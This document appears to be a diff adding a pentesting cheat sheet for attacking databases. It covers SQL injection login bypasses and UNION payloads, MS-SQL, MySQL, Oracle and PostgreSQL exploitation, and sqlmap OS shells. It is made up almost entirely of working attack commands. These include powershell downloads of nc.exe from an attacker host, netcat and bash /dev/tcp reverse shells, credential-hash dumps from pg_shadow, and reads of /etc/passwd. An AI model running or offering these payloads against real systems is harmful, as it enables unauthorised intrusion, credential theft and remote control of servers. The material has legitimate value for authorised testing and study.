@@ -1,0 +1,373 @@
+Databases
+
+
+# SQL Injection
+
+- Bypass a login screen
+generic: ' OR 1=1--
+Windows server: admin'--
+Linux server: root'--
+password: test
+
+Add the following examples to input fields or at the end of a URL.
+' OR 1=1--
+http://target.com/products?category=cars'+OR+1=1--
+
+-- is a comment indicator, this effectively removes the remainder of the query.
+If -- gives an error, use #. Example: ' ORDER BY 1#
+You can also use + for blank spaces. Example: '+OR+1=1--
+
+- Other strings that might work
+' OR 2=2--
+' OR 2-1=1--
+' OR 2>1--
+
+- UNION attack
+The UNION keyword lets you execute an additional SELECT query and append the results to the original query.
+SELECT a, b FROM table1 UNION SELECT c, d FROM table2
+
+' UNION SELECT username, password FROM users--
+
+Determine the number of columns returned by the original query.
+Continue increasing the number until you get an error.
+
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--
+
+Find the column that contains string data.
+This depends on the number of columns you discovered above.
+This example uses 3 columns.
+Look for a row at the bottom of the page with test.
+' UNION SELECT 'test', NULL, NULL--
+' UNION SELECT NULL, 'test', NULL--
+' UNION SELECT NULL, NULL, 'test'--
+
+- Get the database type and version
+Microsoft, MySQL     ' UNION SELECT @@version--
+Oracle               ' UNION SELECT * FROM v$version--
+PostgreSQL           ' UNION SELECT version()--
+
+- List the contents of a database
+' UNION SELECT 'test','foo'--
+' UNION SELECT table_name, NULL FROM information_schema.tables--
+' UNION SELECT username, password FROM users--
+
+' UNION SELECT * FROM information_schema.tables--
+' UNION SELECT * FROM information_schema.columns WHERE table_name = '<table>'--
+
+- Blind SQLi
+'; waitfor delay ('0:0:20')--
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# MS-SQL
+
+- Resources
+https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/
+
+- Locate
+msf > use auxiliary/scanner/mssql/mssql_ping
+nmap -Pn -n -T4 --open -p1434 -sU <target IP>
+nmap -Pn -n -T4 --open -p1434 -sU --script ms-sql-info, ms-sql-brute --script-args mssql.instance-all,userdb=userlist.txt,passdb=wordlist.txt <target IP>
+
+- Metasploit
+msf > use auxiliary/scanner/mssql/mssql_login
+msf > use auxiliary/admin/mssql/mssql_enum
+msf > use auxiliary/scanner/mssql/mssql_hashdump
+msf > use auxiliary/admin/mssql/mssql_escalate_dbowner
+
+- Connect with creds
+impacket-mssqlclient <host name>/<user>@<target IP> -windows-auth
+help
+select @@version;
+SELECT name FROM master..syslogins
+enable_xp_cmdshell
+xp_cmdshell whoami /all
+xp_cmdshell net user
+
+- Get a shell
+cd /usr/share/windows-binaries/
+sudo python3 -m http.server 80
+Open a new tab.
+sudo nc -lvnp 443
+
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://attacker IP/nc.exe -outfile nc.exe"
+xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe <attacker IP> 443"
+
+- Privesc
+wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe
+sudo python3 -m http.server 80
+
+powershell wget http://attacker IP/winPEASx64.exe -outfile winPEASx64.exe
+.\winPEASx64
+Searching know files that can contain creds in home
+
+Open a new tab.
+impacket-psexec administrator@<target IP>
+
+- Authenticate to a db
+Use Microsoft SQL Server Management Studio (SSMS)
+
+- View data
+In the Object Explorer, expand Databases.
+Select a database and expand > expand Tables
+Select a table > right-click > Select Top 1000 Rows
+
+- Save data
+Modify the query in the top pane to include all records.
+Remove all of the fields so the query looks like: SELECT * FROM <table name>
+Select Execute in the ribbon bar
+In the lower pane, right-click on the records > Save Results As
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# MySQL
+
+mysql -h <target IP> -u <username> -p <password>     Login remotely
+
+CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
+CREATE DATABASE <database>;
+GRANT ALL PRIVILEGES ON <database>.* TO 'newuser'@'localhost';
+FLUSH PRIVILEGES;
+
+show databases;
+use <database>;
+show tables;
+select * from <table>
+show fields from <table>;
+
+DELETE FROM <table> WHERE <field>="value";
+
+DROP DATABASE <database>;
+DROP TABLE 'table1', 'table2', 'table3';
+ALTER TABLE <table> DROP COLUMN <field>;
+
+SELECT * FROM <table>;
+SELECT * FROM <table> WHERE <field>="value";
+SELECT LOAD_FILE('/etc/passwd')\g;
+
+SET PASSWORD FOR username@localhost = PASSWORD('newpassword');
+
+UPDATE <table> SET <field>="value";
+
+INSERT INTO <table> VALUES('John', 'Smith', 'john.smith@acme.com');
+
+DISTINCT <field>
+GROUP BY <field>
+LIMIT <number>
+OFFSET <number>
+ORDER BY <field>
+WHERE <field> IS NOT NULL
+WHERE <field> LIKE
+
+\! whoami
+\! sudo whoami
+\! sudo bash
+
+Examples:
+SELECT * FROM hostvulns WHERE vulnerability LIKE "%Default%" ORDER BY vulnerability;
+SELECT * FROM hosts WHERE host LIKE '%|%%' escape '|'
+SELECT LENGTH(vulnerability), COUNT(*) FROM hostvulns GROUP BY LENGTH(vulnerability);
+SELECT DISTINCT last_name,first_name FROM contacts WHERE first_name IS NOT NULL ORDER BY last_name;
+SELECT DISTINCT email FROM contacts WHERE email LIKE "%@target.com" ORDER BY email
+DELETE from profiles WHERE rowid='53';
+UPDATE hostvulns SET tool="Nessus";
+
+# Injection
+
+# General.
+1 UNION SELECT 1,2,3,4
+1 UNION SELECT NULL,NULL,NULL,@@hostname             ubuntu
+1 UNION SELECT NULL,NULL,NULL,version()              5.7.17-0ubuntu0.16.04.2
+1 UNION SELECT NULL,NULL,NULL,current_user()         root@localhost
+1 UNION SELECT NULL,NULL,NULL,user()                 root@localhost
+1 UNION SELECT NULL,NULL,NULL,UUID()                 534c63c1-2e4a-11e9-bb88-00505692e5ab
+
+# List all dbs.
+1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM information_schema.tables
+    information_schema
+    challenge
+    mysql
+    performance_schema
+    sys
+
+# List current db.
+1 UNION SELECT NULL,NULL,NULL,database()
+    challenge
+
+# List tables in the current db.
+1 UNION SELECT NULL,NULL,NULL,TABLE_NAME FROM information_schema.tables WHERE table_schema=‘challenge’
+    comments
+    users
+
+# List column names in the table ‘comments’.
+1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=‘comments’
+    comments id
+    comments username
+    comments comment
+    comments post_date
+
+# List all the data in comments.
+1 UNION SELECT NULL,NULL,NULL,CONCAT(id, 0x0A, username, 0x0A, comment, 0x0A, post_date, 0x0A) FROM comments
+
+# List column names in the table ‘users’.
+1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'
+    users id
+    users username
+    users password
+    users is_admin
+    users signup_date
+    users USER
+    users CURRENT_CONNECTIONS
+    users TOTAL_CONNECTIONS
+
+# List all the data in users.
+1 UNION SELECT NULL,NULL,NULL,CONCAT(username, 0x0A, password) FROM users
+fl4gk33p3r	2DCsG47k5C77X5uMwIwO
+Login > Profile > flag
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Oracle
+
+1. Locate a system running Oracle.
+2. Determine Oracle version.
+3. Determine Oracle SID.
+4. Guess/Brute force USERNAME/PASS.
+5. Privilege escalation via SQL injection.
+6. Manipulate data/post exploitation.
+7. Cover tracks.
+
+
+1. nmap -Pn -n -T4 --open -p1521 <target IP>
+
+2. Example 1
+     msf > use auxiliary/scanner/oracle/tnslsnr_version
+     db_notes
+
+   Example 2
+     tnscmd10g version -h <target IP>
+     tnscmd10g status -h <target IP>
+     Look for the version, LOGFILE, TRACING and PORT.
+
+3. Example 1
+     msf > use auxiliary/scanner/oracle/sid_enum
+     msf > use auxiliary/admin/oracle/sid_brute
+
+   Example 2
+     sidguess -i <target IP> -d /usr/share/metasploit-framework/data/wordlists/sid.txt
+
+   Example 3
+     http://<target IP>:8080/oradb/PUBLIC/GLOBAL_NAME
+
+4. Example 1
+     msf > use auxiliary/admin/oracle/login_brute
+     set SID <sid>
+
+   Example 2
+     sqlplus <username>/<password>@<target IP>:<port>/<SID>
+
+5. msf > use auxiliary/admin/oracle/sql
+   set DBUSER <user>
+   set DBPASS <password>
+   set SID <sid>
+   set SQL select * from user_role_privs
+
+   msf > use auxiliary/admin/oracle/pushin/lt_findricset_cursor
+   set DBUSER <user>
+   set DBPASS <password>
+   set SID <sid>
+   set SQL GRANT DBA TO <user>
+   set SQL GRANT JAVASYSPRIV TO <user>
+
+6. SELECT * FROM v$version;                          Version
+   SELECT * FROM dba_registry_history;               Patch level
+   SELECT * FROM all_users;                          Usernames
+   SELECT owner,table_name from all_tables;          Tables
+   SELECT * FROM session_roles;                      Session roles
+   desc utl_http                                     Describes database objects
+
+http://www.youtube.com/watch?v=SVvAvmjT7V4#t=1535
+
+sqlplus user/password@target IP:1521/database
+sqlplus user/password@target IP:1521/database as sysdba
+
+SELECT * FROM v$Version;                             Show the database version
+SELECT * FROM user_role_privs;                       Check database user permissions
+
+./odat.pydbmsxslprocessor -s <target IP> -d <db> -U <user> -P <password> --putFile 'C:\inetpub\wwwroot\' 'test.txt' /root/test.txt --sysdba
+curl http://target.com/test.txt
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# PostgreSQL
+
+psql -U <username> -h <IP> -d <database>
+select username, passwd from pg_shadow;
+select current_database();
+create table test (input TEXT); copy test from '/etc/passwd'; select input from test;
+
+psql -U postgres -h <IP>                             Login with user 'postgres' and no password
+\l                                                   List databases
+\dt                                                  List tables
+\du                                                  List database users
+\c accounting                                        Connect to the 'accounting' db
+
+select pg_ls_dir('/etc');                            List directory contents of /etc (this requires superuser privileges)
+
+create table tmp(output text);                       Create a table called 'tmp' to house contents from reading files
+copy tmp from program 'ipconfig';                    Run a shell command and save the output 'tmp' table (if this does not work use ifconfig)
+select * from tmp;                                   Show contents of the 'tmp' table
+drop table tmp;                                      Delete table
+
+copy tmp(data) from program 'id';                    Check for system level access
+select proname from pg_proc;                         Enumberate functions
+select * from pg_available_extensions;               Check for unpatched extensions
+
+select current_timestamp - pg_postmaster_start_time() as uptime;   Show uptime
+
+- Dump database creds
+select * from pg_user;
+select * from pg_roles;
+select * from pg_shadow;
+
+- Reverse shell
+create table shell(data text);
+copy shell from program 'bash -i >& /dev/tcp/172.16.1.1/4444 0>&1 &';
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# sqlmap
+
+- Burp
+Extender > BAppStore > CO2 > Install
+Proxy > Intercept > turn on intercept.
+Send a form request with 'tset' using the browser.
+Right-click on the captured request > Extension > CO2 > Send to SQLMapper
+CO2 > Config > SQLMap Path: /usr/bin/sqlmap > OK
+Extra SQLMapper Params: --os-shell
+Because the output screen will be so small, copy the string and paste into a Terminal.
+sqlmap -u 'http://target.com/index.php?search=test' --cookie='PHPSESSID=<cookie>' --os-shell
+
+- If you get a shell, open a new tab in Terminal.
+nc -lvnp 443
+
+- Use sqlmap to make the shell more stable.
+os-shell> bash -c "bash -i >& /dev/tcp/attacker IP/443 0>&1"
+
+- Upgrade your shell to a fully interactive tty shell:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+ctrl+z
+stty raw -echo
+fg
+export TERM=xterm
+cd ~
+
+- Burp 2
+Save the captured request to a file called tmp.
+
+sqlmap -r tmp --force-ssl --batch --dbs --dump
+sqlmap -r tmp --force-ssl --batch -D <database> --tables
+sqlmap -r tmp --force-ssl --batch -D <database> -T <table> --dump
+sqlmap -r tmp --force-ssl --batch --os-cmd id
+sqlmap -r tmp --force-ssl --batch --os-cmd whoami
+sqlmap -r tmp --force-ssl --batch --os-shell
